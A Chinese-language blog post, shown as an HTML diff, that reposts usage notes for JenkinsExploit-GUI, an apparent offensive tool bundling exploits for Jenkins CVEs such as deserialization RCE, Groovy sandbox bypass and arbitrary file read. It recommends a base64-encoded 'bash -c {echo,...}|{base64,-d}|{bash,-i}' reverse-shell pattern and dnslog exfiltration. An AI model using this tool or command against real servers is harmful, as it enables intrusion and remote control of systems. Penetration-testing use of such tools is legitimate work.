@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Jenkins-综合漏洞利用工具 - 杨CC的小世界</title>
+  
+    <link rel="shortcut icon" href="https://pic1.imgdb.cn/item/678a0c34d0e0a243d4f52d7b.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Jenkins-综合漏洞利用工具 - 杨CC的小世界" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="https://yancy77.cn/2025/01/18/Jenkins-%E7%BB%BC%E5%90%88%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/index.html" />
+  
+  <meta property="og:image" content="https://pic1.imgdb.cn/item/678a0c34d0e0a243d4f52d7b.png" />
+  
+  <meta property="og:article:published_time" content="2025-01-18T02:40:38.000Z" />
+  
+  <meta property="og:article:author" content="杨CC" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">杨CC与杨小亿的世界</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/">首页</a>
+            
+            
+            
+            <a class="nav-item" href="/tags">标签</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">分类</a>
+            
+            
+            
+            <a class="nav-item" href="/archives">归档</a>
+            
+            
+            
+            <a class="nav-item" href="/about">关于作者</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/Sgyling" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/渗透/">渗透</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>January</span>
+            <span>18,</span>
+            <span>2025</span>
+        </div>
+        
+
+        <h1 class="title">Jenkins-综合漏洞利用工具</h1>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="jenkins综合漏洞利用工具"><a href="#jenkins综合漏洞利用工具" class="headerlink" title="jenkins综合漏洞利用工具"></a>jenkins综合漏洞利用工具</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="jdk版本"><a href="#jdk版本" class="headerlink" title="jdk版本"></a>jdk版本</h3><p>在windows或linux使用jdk8的哪一个版本都应该可以，在macOS里需要jdk8u以上的版本，比如jdk8u321</p>
+<p>安装jdk8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-8-jdk</span><br></pre></td></tr></table></figure>
+
+
+
+<p>kali切换jdk版本.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="外置有效负载"><a href="#外置有效负载" class="headerlink" title="外置有效负载"></a>外置有效负载</h3><p>从release下载windows_tools,linux_tools或macOS_tools并放在与JenkinsExploit-GUI-*-SNAPSHOT.jar相同的目录,可以或者自行压缩tools_source中的python源码文件</p>
+<p>如果是linux或macOS的话需要对外置payload进行chmod +x 赋予权限 <a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img.png" alt="图片.png"></a> <a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img_1.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img_1.png" alt="img_1.png"></a></p>
+<h3 id="dnslog配置"><a href="#dnslog配置" class="headerlink" title="dnslog配置"></a>dnslog配置</h3><p>进行dnslog设置，目前仅支持dnslog.pw和ceye.io</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img_3.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img_3.png" alt="img_3.png"></a> <a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img_4.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img_4.png" alt="img_4.png"></a></p>
+<h3 id="进行检测"><a href="#进行检测" class="headerlink" title="进行检测"></a>进行检测</h3><p><a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img_2.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img_2.png" alt="img_2.png"></a></p>
+<ul>
+<li>在验证无回显命令执行的时候为了避免转义问题，推荐使用如下方式进行反弹shell和dnslog外带信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,Y....&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="支持检测："><a href="#支持检测：" class="headerlink" title="支持检测："></a>支持检测：</h2><ul>
+<li>CVE-2015-8103&#x2F;CVE-2016-0788 Jenkins 反序列化远程代码执行<a target="_blank" rel="noopener" href="https://github.com/Medicean/VulApps/tree/master/j/jenkins/1">https://github.com/Medicean/VulApps/tree/master/j/jenkins/1</a></li>
+<li>CVE-2016-0792 Jenkins XStream反序列化远程代码执行<a target="_blank" rel="noopener" href="https://github.com/jpiechowka/jenkins-cve-2016-0792">https://github.com/jpiechowka/jenkins-cve-2016-0792</a></li>
+<li>CVE-2017-1000353 Jenkins-CI 远程代码执行漏洞<a target="_blank" rel="noopener" href="https://github.com/vulhub/CVE-2017-1000353">https://github.com/vulhub/CVE-2017-1000353</a></li>
+<li>CVE-2018-1000600 Jenkins GitHub SSRF+信息泄露</li>
+<li>CVE-2018-1000861 Jenkins 绕过Groovy沙盒未授权命令执行漏洞<a target="_blank" rel="noopener" href="https://github.com/orangetw/awesome-jenkins-rce-2019">https://github.com/orangetw/awesome-jenkins-rce-2019</a></li>
+<li>CVE-2018-1999002 Jenkins 任意文件读取<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/MOKeN1qEBonS8bOLw6LH_w">https://mp.weixin.qq.com/s/MOKeN1qEBonS8bOLw6LH_w</a></li>
+<li>CVE-2019-1003000 Jenkins 远程代码执行<a target="_blank" rel="noopener" href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</a></li>
+<li>CVE-2019-1003005&#x2F;CVE-2019-1003029 远程代码执行（脚本安全插件沙箱绕过）<a target="_blank" rel="noopener" href="https://github.com/orangetw/awesome-jenkins-rce-2019">https://github.com/orangetw/awesome-jenkins-rce-2019</a></li>
+<li>CVE-2024-23897 Jenkins CLI接口任意文件读取漏洞<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897">https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897</a></li>
+</ul>
+<h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续:"></a>未完待续:</h2><ul>
+<li><p>CVE-2016-9299 Jenkins ldap 反序列化远程代码执行，添加 poc</p>
+</li>
+<li><p>CVE-2017-1000353 无法检测的错误</p>
+</li>
+<li><p>继续尝试将外部设置的有效负载接入到java代码中</p>
+</li>
+<li><p>新增批量检测功能</p>
+</li>
+<li><h1 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h1><p><a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/JenkinsExploit-GUI">https://github.com/TheBeastofwar/JenkinsExploit-GUI</a></p>
+</li>
+</ul>
+<p> <a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/releases/tag/v1.3">https://github.com/TheBeastofwar/JenkinsExploit-GUI/releases/tag/v1.3</a></p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by 杨CC, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/信息收集-漏扫类/" class="tag">#信息收集-漏扫类</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2025/01/18/JWS-CLI-%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">JWS-CLI-全自动化信息收集工具</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2025/01/18/Golin-%E4%B8%80%E4%BD%93%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Golin-一体化的漏洞扫描工具</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">杨CC与杨小亿的世界</h2>
+                
+                <a href="/" class="item">首页</a>
+                
+                <a href="/archives" class="item">归档</a>
+                
+                <a href="/tags" class="item">标签</a>
+                
+                <a href="/categories" class="item">分类</a>
+                
+                <a href="/about" class="item">关于</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">友情链接</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/Sgyling/Free-proxy-pool" class="item">代理池</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZapcoMan" class="item">ReverseVibe</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">我的</h2>
+                
+                <a target="_blank" rel="noopener" href="https://t.me/time_766" class="item">TG</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/Sgyling" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://qm.qq.com/q/z51eGUnIbu" class="item">QQ交流群</a>
+                
+                <a target="_blank" rel="noopener" href="https://space.bilibili.com/500076166?spm_id_from=333.1007.0.0" class="item">BiliBili</a>
+                
+                <a href="mailto:sgyling@gmail.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2025 杨CC<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
